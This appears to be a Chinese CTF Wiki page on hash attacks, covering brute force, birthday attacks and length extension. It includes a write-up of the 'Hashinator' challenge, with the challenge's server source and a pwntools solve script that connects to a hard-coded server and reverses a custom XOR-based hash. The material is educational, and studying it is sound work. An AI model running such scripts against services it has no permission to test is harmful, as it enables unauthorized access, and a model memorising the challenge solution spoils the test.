\u5e38\u89c1\u7684Hash\u51fd\u6570\u7684\u653b\u51fb\u65b9\u6cd5\u4e3b\u8981\u6709 \u66b4\u529b\u653b\u51fb\uff1a\u4e0d\u4f9d\u8d56\u4e8e\u4efb\u4f55\u7b97\u6cd5\u7ec6\u8282\uff0c\u4ec5\u4e0eHash\u503c\u957f\u5ea6\u6709\u5173\uff1b \u751f\u65e5\u653b\u51fb\u6cd5(Birthday Attack)\uff1a\u6ca1\u6709\u5229\u7528Hash\u51fd\u6570\u7684\u7ed3\u6784\u548c\u4efb\u4f55\u4ee3\u6570\u5f31\u6027\u8d28\uff0c\u53ea\u4f9d\u8d56\u4e8e\u6d88\u606f\u6458\u8981\u7684\u957f\u5ea6\uff0c\u5373Hash\u503c\u7684\u957f\u5ea6\u3002 \u4e2d\u70b9\u4ea4\u4f1a\u653b\u51fb\u6cd5(Meet-In-The-Middle)\uff1a\u662f\u751f\u65e5\u653b\u51fb\u7684\u4e00\u79cd\u53d8\u5f62\uff0c\u4e0d\u6bd4\u8f83Hash\u503c\uff0c\u800c\u662f\u6bd4\u8f83\u4e2d\u95f4\u53d8\u91cf\u3002\u8fd9\u79cd\u653b\u51fb\u4e3b\u8981\u9002\u7528\u4e8e\u653b\u51fb\u5177\u6709\u5206\u7ec4\u94fe\u7ed3\u6784\u7684Hash\u65b9\u6848\u3002 \u5bc6\u7801\u5206\u6790\uff1a\u4f9d\u8d56\u4e8e\u5177\u4f53\u7b97\u6cd5\u7684\u8bbe\u8ba1\u7f3a\u70b9\u3002 \u66b4\u529b\u653b\u51fb \u00b6 HashCat \u5de5\u5177 \u53ef\u4ee5\u8bf4\u662f\u76ee\u524d\u6700\u597d\u7684\u57fa\u4e8e CPU \u548c GPU \u7834\u89e3 Hash \u7684\u8f6f\u4ef6\uff0c\u76f8\u5173\u94fe\u63a5\u5982\u4e0b HashCat \u5b98\u7f51 HashCat \u7b80\u5355\u4f7f\u7528 \u54c8\u5e0c\u957f\u5ea6\u62d3\u5c55\u653b\u51fb\uff08hash length extension attacks\uff09 \u00b6 \u4ecb\u7ecd \u00b6 \u57fa\u672c\u5b9a\u4e49\u5982\u4e0b\uff0c\u6e90\u81ea \u7ef4\u57fa\u767e\u79d1 \u3002 \u54c8\u5e0c\u957f\u5ea6\u6269\u5c55\u653b\u51fb(Hash Length Extension Attacks)\u662f\u6307\u9488\u5bf9\u67d0\u4e9b\u5141\u8bb8\u5305\u542b\u989d\u5916\u4fe1\u606f\u7684\u52a0\u5bc6\u6563\u5217\u51fd\u6570\u7684\u653b\u51fb\u624b\u6bb5\u3002\u8be5\u653b\u51fb\u9002\u7528\u4e8e\u5728 \u6d88\u606f\u4e0e\u5bc6\u94a5\u7684\u957f\u5ea6\u5df2\u77e5 \u7684\u60c5\u5f62\u4e0b\uff0c\u6240\u6709\u91c7\u53d6\u4e86 H(key \u2225 message) \u6b64\u7c7b\u6784\u9020\u7684\u6563\u5217\u51fd\u6570\u3002MD5\u548cSHA-1 \u7b49\u57fa\u4e8e Merkle\u2013Damg\u00e5rd \u6784\u9020\u7684\u7b97\u6cd5\u5747\u5bf9\u6b64\u7c7b\u653b\u51fb\u663e\u793a\u51fa\u8106\u5f31\u6027\u3002 \u8fd9\u7c7b\u54c8\u5e0c\u51fd\u6570\u6709\u4ee5\u4e0b\u7279\u70b9 \u6d88\u606f\u586b\u5145\u65b9\u5f0f\u90fd\u6bd4\u8f83\u7c7b\u4f3c\uff0c\u9996\u5148\u5728\u6d88\u606f\u540e\u9762\u6dfb\u52a0\u4e00\u4e2a1\uff0c\u7136\u540e\u586b\u5145\u82e5\u5e72\u4e2a0\uff0c\u76f4\u81f3\u603b\u957f\u5ea6\u4e0e 448 \u540c\u4f59\uff0c\u6700\u540e\u5728\u5176\u540e\u9644\u4e0a64\u4f4d\u7684\u6d88\u606f\u957f\u5ea6\uff08\u586b\u5145\u524d\uff09\u3002 \u6bcf\u4e00\u5757\u5f97\u5230\u7684\u94fe\u63a5\u53d8\u91cf\u90fd\u4f1a\u88ab\u4f5c\u4e3a\u4e0b\u4e00\u6b21\u6267\u884chash\u51fd\u6570\u7684\u521d\u59cb\u5411\u91cfIV\u3002\u5728\u6700\u540e\u4e00\u5757\u7684\u65f6\u5019\uff0c\u624d\u4f1a\u5c06\u5176\u5bf9\u5e94\u7684\u94fe\u63a5\u53d8\u91cf\u8f6c\u6362\u4e3ahash\u503c\u3002 \u4e00\u822c\u653b\u51fb\u65f6\u5e94\u6ee1\u8db3\u5982\u4e0b\u6761\u4ef6 \u6211\u4eec\u5df2\u77e5 key \u7684\u957f\u5ea6\uff0c\u5982\u679c\u4e0d\u77e5\u9053\u7684\u8bdd\uff0c\u9700\u8981\u7206\u7834\u51fa\u6765 \u6211\u4eec\u53ef\u4ee5\u63a7\u5236 message \u7684\u6d88\u606f\u3002 \u6211\u4eec\u5df2\u7ecf\u77e5\u9053\u4e86\u5305\u542b key \u7684\u4e00\u4e2a\u6d88\u606f\u7684hash\u503c\u3002 \u8fd9\u6837\u6211\u4eec\u5c31\u53ef\u4ee5\u5f97\u5230\u4e00\u5bf9(messge,x)\u6ee1\u8db3x=H(key \u2225 message)\u867d\u7136\u6211\u4eec\u5e76\u4e0d\u6e05\u695akey\u7684\u5185\u5bb9\u3002 \u653b\u51fb\u539f\u7406 \u00b6 \u8fd9\u91cc\u4e0d\u59a8\u5047\u8bbe\u6211\u4eec\u6211\u4eec\u77e5\u9053\u4e86 hash(key+s) \u7684 hash \u503c\uff0c\u5176\u4e2d s \u662f\u5df2\u77e5\u7684\uff0c\u90a3\u4e48\u5176\u672c\u8eab\u5728\u8ba1\u7b97\u7684\u65f6\u5019\uff0c\u5fc5\u7136\u4f1a\u8fdb\u884c\u586b\u5145\u3002\u90a3\u4e48\u6211\u4eec\u9996\u5148\u53ef\u4ee5\u5f97\u5230 key+s \u6269\u5c55\u540e\u7684\u5b57\u7b26\u4e32 now\uff0c\u5373 now=key|s|padding \u90a3\u4e48\u5982\u679c\u6211\u4eec\u5728 now \u7684\u540e\u9762\u518d\u6b21\u9644\u52a0\u4e0a\u4e00\u90e8\u5206\u4fe1\u606fextra\uff0c\u5373 key|s|padding|extra \u8fd9\u6837\u518d\u53bb\u8ba1\u7b97hash\u503c\u7684\u65f6\u5019\uff0c \u4f1a\u5bf9 extra \u8fdb\u884c\u586b\u5145\u76f4\u5230\u6ee1\u8db3\u6761\u4ef6\u3002 \u5148\u8ba1\u7b97 now \u5bf9\u5e94\u7684\u94fe\u63a5\u53d8\u91cf IV1\uff0c\u800c\u6211\u4eec\u5df2\u7ecf\u77e5\u9053\u8fd9\u90e8\u5206\u7684 hash \u503c\uff0c\u5e76\u4e14\u94fe\u63a5\u53d8\u91cf\u4ea7\u751f hash \u503c\u7684\u7b97\u6cd5\u662f\u53ef\u9006\u7684\uff0c\u6240\u4ee5\u6211\u4eec\u53ef\u4ee5\u5f97\u5230\u94fe\u63a5\u53d8\u91cf\u3002 \u4e0b\u9762\u4f1a\u6839\u636e\u5f97\u5230\u7684\u94fe\u63a5\u53d8\u91cf IV1\uff0c\u5bf9 extra \u90e8\u5206\u8fdb\u884c\u54c8\u5e0c\u7b97\u6cd5\uff0c\u5e76\u8fd4\u56dehash\u503c\u3002 \u90a3\u4e48\u65e2\u7136\u6211\u4eec\u5df2\u7ecf\u77e5\u9053\u4e86\u7b2c\u4e00\u90e8\u5206\u7684 hash \u503c\uff0c\u5e76\u4e14\uff0c\u6211\u4eec\u8fd8\u77e5\u9053 extra \u7684\u503c\uff0c\u90a3\u4e48\u6211\u4eec\u4fbf\u53ef\u4ee5\u5f97\u5230\u6700\u540e\u7684hash\u503c\u3002 \u800c\u4e4b\u524d\u6211\u4eec\u4e5f\u8bf4\u4e86\u6211\u4eec\u53ef\u4ee5\u63a7\u5236 message \u7684\u503c\u3002\u90a3\u4e48\u5176\u5b9e s\uff0cpadding\uff0cextra \u6211\u4eec\u90fd\u662f\u53ef\u4ee5\u63a7\u5236\u7684\u3002\u6240\u4ee5\u6211\u4eec\u81ea\u7136\u53ef\u4ee5\u627e\u5230\u5bf9\u5e94\u7684(message,x)\u6ee1\u8db3x=hash(key|message)\u3002 \u4f8b\u5b50 \u00b6 \u4f3c\u4e4e\u5927\u90fd\u662fweb\u91cc\u9762\u7684\uff0c\uff0c\u4e0d\u592a\u61c2web\uff0c\u6682\u65f6\u5148\u4e0d\u7ed9\u4f8b\u5b50\u4e86\u3002 \u5de5\u5177 \u00b6 hashpump \u5982\u4f55\u4f7f\u7528\u8bf7\u53c2\u8003github\u4e0a\u7684readme\u3002 hash\u7b97\u6cd5\u8bbe\u8ba1\u6709\u8bef \u00b6 \u4e00\u4e9b\u81ea\u5b9a\u4e49\u7684hash\u7b97\u6cd5\u53ef\u80fd\u662f\u53ef\u9006\u7684\u3002 Hashinator \u00b6 \u9898\u76ee\u7684\u903b\u8f91\u5f88\u7b80\u5355\uff0c\u4ece\u4e00\u4e2a\u77e5\u540d\u7684\u5bc6\u7801\u5b57\u5178\"rockyou\"\u6311\u9009\u51fa\u4e00\u4e2a password \uff0c\u5e76\u4e14\u4f7f\u7528\u591a\u79cdhash\u7b97\u6cd5\u968f\u673a\u7684\u54c8\u5e0c32\u8f6e\u3002\u6211\u4eec\u9700\u8981\u4ece\u6700\u540e\u7684hash\u7ed3\u679c\u4e2d\u7834\u89e3\u51fa\u539f\u59cb\u7684 password \u3002 \u5206\u6790 \u00b6 \u9898\u76ee\u91c7\u7528\u7684hash\u7b97\u6cd5\u6709\uff1a md5 \uff0c sha1 \uff0c blake \uff0c scrypt \u3002 \u5173\u952e\u7684\u4ee3\u7801\u5982\u4e0b\uff1a password = self . generate_password () # from rock_you.txt salt = self . generate_salt ( password ) # \u4e0epassword\u7684\u957f\u5ea6\u6709\u5173 hash_rounds = self . generate_rounds () # \u751f\u6210\u8fdb\u884chash\u7b97\u6cd5\u7684\u987a\u5e8f password_hash = self . calculate_hash ( salt + password , hash_rounds ) 1. \u7a0b\u5e8f\u9996\u5148\u901a\u8fc7\u4ece rockyou.txt \u4e2d\u968f\u673a\u62bd\u53d6\u4e00\u4e2a password \uff0c\u4f5c\u4e3a\u52a0\u5bc6\u7684\u660e\u6587\u3002 2. \u7136\u540e\u6839\u636e\u62bd\u53d6\u7684 password \u7684\u957f\u5ea6\uff0c\u751f\u6210\u4e00\u4e2a\u957f\u5ea6\u4e3a 128 - len(password) \u7684 salt \u3002 3. \u4ece\u4e4b\u524d\u5217\u4e3e\u76844\u79cdhash\u7b97\u6cd5\u4e2d\u62bd\u53d6\uff0c\u7ec4\u621032\u8f6e\u7684\u54c8\u5e0c\u8fd0\u7b97\u3002 4. \u6839\u636e\u4e4b\u524d\u5f97\u5230\u7684 password \u3001 salt \u8ba1\u7b97\u51fa\u6700\u540e\u7ed9\u6211\u4eec\u7684 password_hash \u3002 \u5f88\u660e\u663e\uff0c\u6211\u4eec\u4e0d\u53ef\u80fd\u901a\u8fc7\u9006\u5411hash\u7b97\u6cd5\u6765\u5b8c\u6210\u9898\u76ee\u3002 \u6211\u4eec\u77e5\u9053\u6240\u6709\u7684\u53ef\u80fd\u7684\u660e\u6587\uff0c\u9996\u5148\u8003\u8651\u80fd\u5426\u901a\u8fc7\u6784\u9020\u5f69\u8679\u8868\u6765\u5b8c\u6210\u7a77\u4e3e\u3002\u4f46\u662f\u6ce8\u610f\u5230 generate_salt() \u51fd\u6570\u4e2d\uff0c salt \u548c password \u7684\u957f\u5ea6\u7ec4\u5408\u8d85\u8fc7\u4e86128byte\u7684\u957f\u5ea6\uff0c\u5e76\u4e14\u88ab\u6ce8\u91ca\u4e86 msize = 128 # f-you hashcat :D so\uff0c\u53ea\u80fd\u65e0\u5948\u653e\u5f03\u3002 \u90a3\u8fd9\u6837\u7684\u8bdd\uff0c\u53ea\u5b58\u5728\u4e00\u79cd\u53ef\u80fd\uff0c\u4e5f\u5373\u7b97\u6cd5\u53ef\u9006\u3002\u67e5\u770b calculate_hash() \u51fd\u6570\u7684\u5177\u4f53\u5b9e\u73b0\uff0c\u53ef\u4ee5\u53d1\u73b0\u5982\u4e0b\u53ef\u7591\u7684\u4ee3\u7801\uff1a for i in range ( len ( hash_rounds )): interim_salt = xor ( interim_salt , hash_rounds [ - 1 - i ]( interim_hash )) interim_hash = xor ( interim_hash , hash_rounds [ i ]( interim_salt )) final_hash = interim_salt + interim_hash \u91cd\u65b0\u68b3\u7406\u4e00\u4e0b\u6211\u4eec\u77e5\u9053\u7684\u4fe1\u606f\uff1a 1. hash_rounds\u4e2d\u4fdd\u5b58\u4e8632\u8f6e\uff0c\u5373\u6bcf\u8f6e\u8981\u4f7f\u7528\u7684hash\u51fd\u6570\u53e5\u67c4\u3002 2. final_hash\u662f\u6700\u540e\u7ed9\u6211\u4eec\u7684hash\u7ed3\u679c\u3002 3. hash_rounds\u4e2d\u7684\u5185\u5bb9\u4e5f\u4f1a\u5728\u751f\u6210\u4e4b\u540e\u6253\u5370\u7ed9\u6211\u4eec\u3002 4. \u6211\u4eec\u5e0c\u671b\u5f97\u5230 interim_salt \u548c interim_hash \u5728\u7b2c\u4e00\u8f6e\u7684\u503c\u3002 5. interim_salt \u548c interim_hash \u7684\u957f\u5ea6\u5747\u4e3a64byte\u3002 \u4ed4\u7ec6\u89c2\u5bdf\u4e00\u4e0b interim_salt \u548c interim_hash \u7684\u8ba1\u7b97\u65b9\u6cd5\uff0c\u53ef\u4ee5\u53d1\u73b0\u5b83\u662f\u53ef\u9006\u7684\u3002 interim\\_hash_1 = interim\\_hash_2 \\oplus hash\\_rounds[i](interim\\_salt_3) interim\\_hash_1 = interim\\_hash_2 \\oplus hash\\_rounds[i](interim\\_salt_3) \u8fd9\u884c\u4ee3\u7801\u91cc\uff0c\u6211\u4eec\u5df2\u77e5 interim\\_hash_1 interim\\_hash_1 \u548c interim\\_salt_3 interim\\_salt_3 \uff0c\u7531\u6b64\u53ef\u4ee5\u63a8\u51fa interim\\_hash_2 interim\\_hash_2 \u7684\u503c\uff0c\u800c interim\\_hash_2 interim\\_hash_2 \u5219\u662f\u4e0a\u4e00\u8f6e\u7684 interim_hash \u3002 \u4ee5\u6b64\u65b9\u6cd5\u9006\u63a832\u6b21\uff0c\u5219\u53ef\u4ee5\u5f97\u5230\u6700\u521d\u7684 password \u548c salt \u3002 \u5177\u4f53\u7684\u89e3\u5bc6\u811a\u672c\u4e3a\uff1a import os import hashlib import socket import threading import socketserver import struct import time import threading # import pyscrypt from base64 import b64encode , b64decode from pwn import * def md5 ( bytestring ): return hashlib . md5 ( bytestring ) . digest () def sha ( bytestring ): return hashlib . sha1 ( bytestring ) . digest () def blake ( bytestring ): return hashlib . blake2b ( bytestring ) . digest () def scrypt ( bytestring ): l = int ( len ( bytestring ) / 2 ) salt = bytestring [: l ] p = bytestring [ l :] return hashlib . scrypt ( p , salt = salt , n = 2 ** 16 , r = 8 , p = 1 , maxmem = 67111936 ) # return pyscrypt.hash(p, salt, 2**16, 8, 1, dkLen=64) def xor ( s1 , s2 ): return b '' . join ([ bytes ([ s1 [ i ] ^ s2 [ i % len ( s2 )]]) for i in range ( len ( s1 ))]) def main (): # io = socket.socket(family=socket.AF_INET) # io.connect(('47.88.216.38', 20013)) io = remote ( '47.88.216.38' , 20013 ) print ( io . recv ( 1000 )) ans_array = bytearray () while True : buf = io . recv ( 1 ) if buf : ans_array . extend ( buf ) if buf == b '!' : break password_hash_base64 = ans_array [ ans_array . find ( b \"b'\" ) + 2 : ans_array . find ( b \"' \\n \" )] password_hash = b64decode ( password_hash_base64 ) print ( 'password:' , password_hash ) method_bytes = ans_array [ ans_array . find ( b 'used: \\n ' ) + 6 : ans_array . find ( b ' \\n Your' ) ] methods = method_bytes . split ( b ' \\n ' ) methods = [ bytes ( x . strip ( b '- ' )) . decode () for x in methods ] print ( methods ) in_salt = password_hash [: 64 ] in_hash = password_hash [ 64 :] for pos , neg in zip ( methods , methods [:: - 1 ]): ''' interim_salt = xor(interim_salt, hash_rounds[-1-i](interim_hash)) interim_hash = xor(interim_hash, hash_rounds[i](interim_salt)) ''' in_hash = xor ( in_hash , eval ( \" {} (in_salt)\" . format ( neg ))) in_salt = xor ( in_salt , eval ( \" {} (in_hash)\" . format ( pos ))) print ( in_hash , in_salt ) print ( in_hash [ - 20 :]) io . interactive () main () \u539fhash\u7b97\u6cd5 \u00b6 import os import hashlib import socket import threading import socketserver import struct import time # import pyscrypt from base64 import b64encode def md5 ( bytestring ): return hashlib . md5 ( bytestring ) . digest () def sha ( bytestring ): return hashlib . sha1 ( bytestring ) . digest () def blake ( bytestring ): return hashlib . blake2b ( bytestring ) . digest () def scrypt ( bytestring ): l = int ( len ( bytestring ) / 2 ) salt = bytestring [: l ] p = bytestring [ l :] return hashlib . scrypt ( p , salt = salt , n = 2 ** 16 , r = 8 , p = 1 , maxmem = 67111936 ) # return pyscrypt.hash(p, salt, 2**16, 8, 1) def xor ( s1 , s2 ): return b '' . join ([ bytes ([ s1 [ i ] ^ s2 [ i % len ( s2 )]]) for i in range ( len ( s1 ))]) class HashHandler ( socketserver . BaseRequestHandler ): welcome_message = \"\"\" Welcome, young wanna-be Cracker, to the Hashinator. To prove your worthiness, you must display the power of your cracking skills. The test is easy: 1. We send you a password from the rockyou list, hashed using multiple randomly chosen algorithms. 2. You crack the hash and send back the original password. As you already know the dictionary and won't need any fancy password rules, {} seconds should be plenty, right? Please wait while we generate your hash... \"\"\" hashes = [ md5 , sha , blake , scrypt ] timeout = 10 total_rounds = 32 def handle ( self ): self . request . sendall ( self . welcome_message . format ( self . timeout ) . encode ()) password = self . generate_password () # from rock_you.txt salt = self . generate_salt ( password ) # \u4e0epassword\u7684\u957f\u5ea6\u6709\u5173 hash_rounds = self . generate_rounds () # \u751f\u6210\u8fdb\u884chash\u7b97\u6cd5\u7684\u987a\u5e8f password_hash = self . calculate_hash ( salt + password , hash_rounds ) self . generate_delay () self . request . sendall ( \"Challenge password hash: {} \\n \" . format ( b64encode ( password_hash )) . encode ()) self . request . sendall ( \"Rounds used: \\n \" . encode ()) test_rounds = [] for r in hash_rounds : test_rounds . append ( r ) for r in hash_rounds : self . request . sendall ( \"- {} \\n \" . format ( r . __name__ ) . encode ()) self . request . sendall ( \"Your time starts now! \\n \" . encode ()) self . request . settimeout ( self . timeout ) try : response = self . request . recv ( 1024 ) if response . strip () == password : self . request . sendall ( \"Congratulations! You are a true cracking master! \\n \" . encode ()) self . request . sendall ( \"Welcome to the club: {} \\n \" . format ( flag ) . encode ()) return except socket . timeout : pass self . request . sendall ( \"Your cracking skills are bad, and you should feel bad!\" . encode ()) def generate_password ( self ): rand = struct . unpack ( \"I\" , os . urandom ( 4 ))[ 0 ] lines = 14344391 # size of rockyou line = rand % lines password = \"\" f = open ( 'rockyou.txt' , 'rb' ) for i in range ( line ): password = f . readline () return password . strip () def generate_salt ( self , p ): msize = 128 # f-you hashcat :D salt_size = msize - len ( p ) return os . urandom ( salt_size ) def generate_rounds ( self ): rand = struct . unpack ( \"Q\" , os . urandom ( 8 ))[ 0 ] rounds = [] for i in range ( self . total_rounds ): rounds . append ( self . hashes [ rand % len ( self . hashes )]) rand = rand >> 2 return rounds def calculate_hash ( self , payload , hash_rounds ): interim_salt = payload [: 64 ] interim_hash = payload [ 64 :] for i in range ( len ( hash_rounds )): interim_salt = xor ( interim_salt , hash_rounds [ - 1 - i ]( interim_hash )) interim_hash = xor ( interim_hash , hash_rounds [ i ]( interim_salt )) ''' interim_hash = xor( interim_hash, hash_rounds[i]( xor(interim_salt, hash_rounds[-1-i](interim_hash)) ) ) ''' final_hash = interim_salt + interim_hash return final_hash def generate_delay ( self ): rand = struct . unpack ( \"I\" , os . urandom ( 4 ))[ 0 ] time . sleep ( rand / 1000000000.0 ) class ThreadedTCPServer ( socketserver . ThreadingMixIn , socketserver . TCPServer ): allow_reuse_address = True PORT = 1337 HOST = '0.0.0.0' flag = \"\" with open ( \"flag.txt\" ) as f : flag = f . read () def main (): server = ThreadedTCPServer (( HOST , PORT ), HashHandler ) server_thread = threading . Thread ( target = server . serve_forever ) server_thread . start () server_thread . join () if __name__ == \"__main__\" : main ()","title":"Hash Attack"},{"location":"crypto/hash/attack/#hash-attack","text":"\u5e38\u89c1\u7684Hash\u51fd\u6570\u7684\u653b\u51fb\u65b9\u6cd5\u4e3b\u8981\u6709 \u66b4\u529b\u653b\u51fb\uff1a\u4e0d\u4f9d\u8d56\u4e8e\u4efb\u4f55\u7b97\u6cd5\u7ec6\u8282\uff0c\u4ec5\u4e0eHash\u503c\u957f\u5ea6\u6709\u5173\uff1b \u751f\u65e5\u653b\u51fb\u6cd5(Birthday Attack)\uff1a\u6ca1\u6709\u5229\u7528Hash\u51fd\u6570\u7684\u7ed3\u6784\u548c\u4efb\u4f55\u4ee3\u6570\u5f31\u6027\u8d28\uff0c\u53ea\u4f9d\u8d56\u4e8e\u6d88\u606f\u6458\u8981\u7684\u957f\u5ea6\uff0c\u5373Hash\u503c\u7684\u957f\u5ea6\u3002 \u4e2d\u70b9\u4ea4\u4f1a\u653b\u51fb\u6cd5(Meet-In-The-Middle)\uff1a\u662f\u751f\u65e5\u653b\u51fb\u7684\u4e00\u79cd\u53d8\u5f62\uff0c\u4e0d\u6bd4\u8f83Hash\u503c\uff0c\u800c\u662f\u6bd4\u8f83\u4e2d\u95f4\u53d8\u91cf\u3002\u8fd9\u79cd\u653b\u51fb\u4e3b\u8981\u9002\u7528\u4e8e\u653b\u51fb\u5177\u6709\u5206\u7ec4\u94fe\u7ed3\u6784\u7684Hash\u65b9\u6848\u3002 \u5bc6\u7801\u5206\u6790\uff1a\u4f9d\u8d56\u4e8e\u5177\u4f53\u7b97\u6cd5\u7684\u8bbe\u8ba1\u7f3a\u70b9\u3002","title":"Hash Attack"},{"location":"crypto/hash/attack/#_1","text":"HashCat \u5de5\u5177 \u53ef\u4ee5\u8bf4\u662f\u76ee\u524d\u6700\u597d\u7684\u57fa\u4e8e CPU \u548c GPU \u7834\u89e3 Hash \u7684\u8f6f\u4ef6\uff0c\u76f8\u5173\u94fe\u63a5\u5982\u4e0b HashCat \u5b98\u7f51 HashCat \u7b80\u5355\u4f7f\u7528","title":"\u66b4\u529b\u653b\u51fb"},{"location":"crypto/hash/attack/#hash-length-extension-attacks","text":"","title":"\u54c8\u5e0c\u957f\u5ea6\u62d3\u5c55\u653b\u51fb\uff08hash length extension attacks\uff09"},{"location":"crypto/hash/attack/#_2","text":"\u57fa\u672c\u5b9a\u4e49\u5982\u4e0b\uff0c\u6e90\u81ea \u7ef4\u57fa\u767e\u79d1 \u3002 \u54c8\u5e0c\u957f\u5ea6\u6269\u5c55\u653b\u51fb(Hash Length Extension Attacks)\u662f\u6307\u9488\u5bf9\u67d0\u4e9b\u5141\u8bb8\u5305\u542b\u989d\u5916\u4fe1\u606f\u7684\u52a0\u5bc6\u6563\u5217\u51fd\u6570\u7684\u653b\u51fb\u624b\u6bb5\u3002\u8be5\u653b\u51fb\u9002\u7528\u4e8e\u5728 \u6d88\u606f\u4e0e\u5bc6\u94a5\u7684\u957f\u5ea6\u5df2\u77e5 \u7684\u60c5\u5f62\u4e0b\uff0c\u6240\u6709\u91c7\u53d6\u4e86 H(key \u2225 message) \u6b64\u7c7b\u6784\u9020\u7684\u6563\u5217\u51fd\u6570\u3002MD5\u548cSHA-1 \u7b49\u57fa\u4e8e Merkle\u2013Damg\u00e5rd \u6784\u9020\u7684\u7b97\u6cd5\u5747\u5bf9\u6b64\u7c7b\u653b\u51fb\u663e\u793a\u51fa\u8106\u5f31\u6027\u3002 \u8fd9\u7c7b\u54c8\u5e0c\u51fd\u6570\u6709\u4ee5\u4e0b\u7279\u70b9 \u6d88\u606f\u586b\u5145\u65b9\u5f0f\u90fd\u6bd4\u8f83\u7c7b\u4f3c\uff0c\u9996\u5148\u5728\u6d88\u606f\u540e\u9762\u6dfb\u52a0\u4e00\u4e2a1\uff0c\u7136\u540e\u586b\u5145\u82e5\u5e72\u4e2a0\uff0c\u76f4\u81f3\u603b\u957f\u5ea6\u4e0e 448 \u540c\u4f59\uff0c\u6700\u540e\u5728\u5176\u540e\u9644\u4e0a64\u4f4d\u7684\u6d88\u606f\u957f\u5ea6\uff08\u586b\u5145\u524d\uff09\u3002 \u6bcf\u4e00\u5757\u5f97\u5230\u7684\u94fe\u63a5\u53d8\u91cf\u90fd\u4f1a\u88ab\u4f5c\u4e3a\u4e0b\u4e00\u6b21\u6267\u884chash\u51fd\u6570\u7684\u521d\u59cb\u5411\u91cfIV\u3002\u5728\u6700\u540e\u4e00\u5757\u7684\u65f6\u5019\uff0c\u624d\u4f1a\u5c06\u5176\u5bf9\u5e94\u7684\u94fe\u63a5\u53d8\u91cf\u8f6c\u6362\u4e3ahash\u503c\u3002 \u4e00\u822c\u653b\u51fb\u65f6\u5e94\u6ee1\u8db3\u5982\u4e0b\u6761\u4ef6 \u6211\u4eec\u5df2\u77e5 key \u7684\u957f\u5ea6\uff0c\u5982\u679c\u4e0d\u77e5\u9053\u7684\u8bdd\uff0c\u9700\u8981\u7206\u7834\u51fa\u6765 \u6211\u4eec\u53ef\u4ee5\u63a7\u5236 message \u7684\u6d88\u606f\u3002 \u6211\u4eec\u5df2\u7ecf\u77e5\u9053\u4e86\u5305\u542b key \u7684\u4e00\u4e2a\u6d88\u606f\u7684hash\u503c\u3002 \u8fd9\u6837\u6211\u4eec\u5c31\u53ef\u4ee5\u5f97\u5230\u4e00\u5bf9(messge,x)\u6ee1\u8db3x=H(key \u2225 message)\u867d\u7136\u6211\u4eec\u5e76\u4e0d\u6e05\u695akey\u7684\u5185\u5bb9\u3002","title":"\u4ecb\u7ecd"},{"location":"crypto/hash/attack/#_3","text":"\u8fd9\u91cc\u4e0d\u59a8\u5047\u8bbe\u6211\u4eec\u6211\u4eec\u77e5\u9053\u4e86 hash(key+s) \u7684 hash \u503c\uff0c\u5176\u4e2d s \u662f\u5df2\u77e5\u7684\uff0c\u90a3\u4e48\u5176\u672c\u8eab\u5728\u8ba1\u7b97\u7684\u65f6\u5019\uff0c\u5fc5\u7136\u4f1a\u8fdb\u884c\u586b\u5145\u3002\u90a3\u4e48\u6211\u4eec\u9996\u5148\u53ef\u4ee5\u5f97\u5230 key+s \u6269\u5c55\u540e\u7684\u5b57\u7b26\u4e32 now\uff0c\u5373 now=key|s|padding \u90a3\u4e48\u5982\u679c\u6211\u4eec\u5728 now \u7684\u540e\u9762\u518d\u6b21\u9644\u52a0\u4e0a\u4e00\u90e8\u5206\u4fe1\u606fextra\uff0c\u5373 key|s|padding|extra \u8fd9\u6837\u518d\u53bb\u8ba1\u7b97hash\u503c\u7684\u65f6\u5019\uff0c \u4f1a\u5bf9 extra \u8fdb\u884c\u586b\u5145\u76f4\u5230\u6ee1\u8db3\u6761\u4ef6\u3002 \u5148\u8ba1\u7b97 now \u5bf9\u5e94\u7684\u94fe\u63a5\u53d8\u91cf IV1\uff0c\u800c\u6211\u4eec\u5df2\u7ecf\u77e5\u9053\u8fd9\u90e8\u5206\u7684 hash \u503c\uff0c\u5e76\u4e14\u94fe\u63a5\u53d8\u91cf\u4ea7\u751f hash \u503c\u7684\u7b97\u6cd5\u662f\u53ef\u9006\u7684\uff0c\u6240\u4ee5\u6211\u4eec\u53ef\u4ee5\u5f97\u5230\u94fe\u63a5\u53d8\u91cf\u3002 \u4e0b\u9762\u4f1a\u6839\u636e\u5f97\u5230\u7684\u94fe\u63a5\u53d8\u91cf IV1\uff0c\u5bf9 extra \u90e8\u5206\u8fdb\u884c\u54c8\u5e0c\u7b97\u6cd5\uff0c\u5e76\u8fd4\u56dehash\u503c\u3002 \u90a3\u4e48\u65e2\u7136\u6211\u4eec\u5df2\u7ecf\u77e5\u9053\u4e86\u7b2c\u4e00\u90e8\u5206\u7684 hash \u503c\uff0c\u5e76\u4e14\uff0c\u6211\u4eec\u8fd8\u77e5\u9053 extra \u7684\u503c\uff0c\u90a3\u4e48\u6211\u4eec\u4fbf\u53ef\u4ee5\u5f97\u5230\u6700\u540e\u7684hash\u503c\u3002 \u800c\u4e4b\u524d\u6211\u4eec\u4e5f\u8bf4\u4e86\u6211\u4eec\u53ef\u4ee5\u63a7\u5236 message \u7684\u503c\u3002\u90a3\u4e48\u5176\u5b9e s\uff0cpadding\uff0cextra \u6211\u4eec\u90fd\u662f\u53ef\u4ee5\u63a7\u5236\u7684\u3002\u6240\u4ee5\u6211\u4eec\u81ea\u7136\u53ef\u4ee5\u627e\u5230\u5bf9\u5e94\u7684(message,x)\u6ee1\u8db3x=hash(key|message)\u3002","title":"\u653b\u51fb\u539f\u7406"},{"location":"crypto/hash/attack/#_4","text":"\u4f3c\u4e4e\u5927\u90fd\u662fweb\u91cc\u9762\u7684\uff0c\uff0c\u4e0d\u592a\u61c2web\uff0c\u6682\u65f6\u5148\u4e0d\u7ed9\u4f8b\u5b50\u4e86\u3002","title":"\u4f8b\u5b50"},{"location":"crypto/hash/attack/#_5","text":"hashpump \u5982\u4f55\u4f7f\u7528\u8bf7\u53c2\u8003github\u4e0a\u7684readme\u3002","title":"\u5de5\u5177"},{"location":"crypto/hash/attack/#hash","text":"\u4e00\u4e9b\u81ea\u5b9a\u4e49\u7684hash\u7b97\u6cd5\u53ef\u80fd\u662f\u53ef\u9006\u7684\u3002","title":"hash\u7b97\u6cd5\u8bbe\u8ba1\u6709\u8bef"},{"location":"crypto/hash/attack/#hashinator","text":"\u9898\u76ee\u7684\u903b\u8f91\u5f88\u7b80\u5355\uff0c\u4ece\u4e00\u4e2a\u77e5\u540d\u7684\u5bc6\u7801\u5b57\u5178\"rockyou\"\u6311\u9009\u51fa\u4e00\u4e2a password 